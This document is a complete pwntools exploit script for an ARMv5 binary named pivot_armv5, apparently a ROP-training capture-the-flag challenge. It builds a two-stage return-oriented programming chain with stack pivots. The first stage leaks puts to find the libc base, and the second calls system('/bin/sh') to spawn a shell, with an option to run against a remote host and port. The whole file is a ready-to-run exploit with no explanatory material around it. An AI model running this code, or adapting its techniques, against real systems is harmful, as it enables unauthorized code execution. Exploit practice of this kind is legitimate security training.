from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./pivot_armv5")
libc = ELF("/etc/qemu-binfmt/arm/lib/libc.so.6", checksec = False)


class ROPS:
    pivot     = 0x000108f0  # mov r5, r4; mov r4, sp; mov sp, r5; pop {r4, fp, pc};
    pop_r3    = 0x000105d4  # pop {r3, pc};
    pop_r4    = 0x00010760  # pop {r4, pc};
    pop_all   = 0x00010984  # pop {r4, r5, r6, r7, r8, sb, sl, pc};
    mov_r0_r7 = 0x00010974  # mov r0, r7; blx r3;


class LIBC_ROPS:
    mov_r0_pop = 0x00031be4  # mov r0, r4; pop {r4, pc};


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)


def extract_pivot(io):
    io.recvuntil(b"place to pivot: ")
    return int(io.recvline()[:-1], 16)


def extract_libc_base(io):
    io.recvuntil(b"Thank you!\n")
    leak = int.from_bytes(io.recv(4), "little")
    return leak - libc.sym.puts


def solve():
    io = conn()
    io.newline = b"\n"

    pivot_point = extract_pivot(io)
    log.info(f"Pivot point 1: {hex(pivot_point)}")

    padding = cyclic(36)

    payload = [
        0xDEADBEEF,
        0xDEADBEEF,
        ROPS.pop_r3,
        ROPS.pop_r3,  # Put the rop address in r3
        ROPS.pop_all,
        0xDEADBEEF,  # r4
        0xDEADBEEF,  # r5
        0xDEADBEEF,  # r6
        elf.got.puts,  # r7
        0xDEADBEEF,  # r8
        0xDEADBEEF,  # sb
        0xDEADBEEF,  # sl
        ROPS.mov_r0_r7,  # Sets up args and puts pop_r3 gadget into LR
        0xDEADBEEF,  # r3
        elf.plt.puts,  # Ends up in __libc_csu pops after execution
        0xDEADBEEF,  # r4
        0xDEADBEEF,  # r5
        0xDEADBEEF,  # r6
        0xDEADBEEF,  # r7
        0xDEADBEEF,  # r8
        0xDEADBEEF,  # sb
        0xDEADBEEF,  # sl
        elf.sym.main
    ]

    pivot = [
        padding,
        ROPS.pop_r4,
        pivot_point,
        ROPS.pivot
    ]

    io.sendafter(b"> ", flat(payload))
    io.sendafter(b"> ", flat(pivot))

    libc.address = extract_libc_base(io)
    log.info(f"LIBC base: {hex(libc.address)}")

    pivot_point2 = extract_pivot(io)
    log.info(f"Pivot point 2: {hex(pivot_point2)}")

    payload2 = [
        next(libc.search(b"/bin/sh\0")),
        0xDEADBEEF,
        LIBC_ROPS.mov_r0_pop + libc.address,
        0xDEADBEEF,
        libc.sym.system
    ]

    pivot2 = [
        padding,
        ROPS.pop_r4,
        pivot_point2,
        ROPS.pivot
    ]

    io.sendafter(b"> ", flat(payload2))
    io.sendafter(b"> ", flat(pivot2))

    io.interactive()


if __name__ == "__main__":
    solve()